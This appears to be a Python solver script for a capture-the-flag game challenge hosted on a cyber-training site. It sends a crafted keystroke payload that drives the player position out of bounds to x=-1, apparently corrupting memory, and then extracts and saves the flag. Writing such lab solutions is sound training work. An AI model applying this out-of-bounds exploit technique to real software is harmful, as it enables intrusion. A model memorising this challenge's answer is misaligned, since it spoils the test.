import socket, time, re, sys
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST, PORT = "xebec.cylabacademy.net", 27860
keys = b"l]" + b"w" * 4 + b"d" * 47 + b"w"
line = keys + b"\n"
s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(1.0)
time.sleep(0.5)
t0 = time.time(); last = time.time(); buf = b""
while time.time() - t0 < 6:
    try:
        d = s.recv(65536)
    except socket.timeout:
        if time.time() - last > 0.8:
            break
        continue
    if not d:
        break
    buf += d; last = time.time()
print("banner done", len(buf), flush=True)
s.sendall(line)
out = b""
t0 = time.time(); last = time.time()
while time.time() - t0 < 180:
    try:
        d = s.recv(65536)
    except socket.timeout:
        if time.time() - last > 5:
            break
        continue
    if not d:
        print("closed", flush=True)
        break
    out += d; last = time.time()
    if b"Player position: -1" in out:
        print("reached x=-1 at %.1fs" % (time.time() - t0), flush=True)
    if re.search(rb"(academy|picoCTF)\{[^}]{1,120}\}", out):
        break
s.close()
allout = buf + out
pos = re.findall(rb"Player position: (-?\d+) (-?\d+)", allout)
print("num maps:", len(pos), "last:", pos[-2:] if pos else None)
m = re.search(rb"(academy|picoCTF)\{[^}]{1,120}\}", allout)
print("FLAG:", m.group(0).decode() if m else None)
if m:
    open(r"./_z_bg2_flag.txt", "w").write(m.group(0).decode())
print("tail:", allout[-200:])
